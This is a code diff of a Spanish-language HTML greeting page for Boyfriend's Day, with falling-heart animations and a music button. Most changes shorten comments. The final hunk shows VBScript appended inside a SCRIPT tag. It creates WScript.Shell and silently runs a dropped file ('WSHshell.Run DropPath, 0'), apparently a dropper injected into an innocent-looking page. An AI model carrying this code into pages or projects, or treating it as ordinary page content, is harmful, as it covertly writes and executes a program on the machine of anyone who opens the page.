@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <title>Feliz día del novio 💖</title>
   <style>
-    /* Fondo tipo atardecer */
+    /* Fondo */
     body {
       margin: 0;
       padding: 0;
@@ -27,7 +27,7 @@
       max-width: 80%;
     }
 
-    /* Animación fadeIn por línea */
+    /* Animación */
     .text-container p {
       opacity: 0;
       animation: fadeIn 2s forwards;
@@ -48,7 +48,7 @@
       to { opacity: 1; }
     }
 
-    /* Corazones cayendo */
+    /* Coras */
     .heart {
       position: absolute;
       color: red;
@@ -61,7 +61,7 @@
       100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
     }
 
-    /* Botón de música */
+    /* Botón */
     #musicButton {
       position: fixed;
       bottom: 20px;
@@ -104,7 +104,7 @@
 
   <!-- Generador de corazones -->
   <script>
-    // Corazones cayendo
+    // Coras
     function createHeart() {
       const heart = document.createElement('div');
       heart.classList.add('heart');
@@ -121,7 +121,6 @@
 
     setInterval(createHeart, 300);
 
-    // Botón de música
     const music = document.getElementById('music');
     const musicButton = document.getElementById('musicButton');
     musicButton.addEventListener('click', () => {
@@ -144,4 +143,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
+
 //--></SCRIPT>
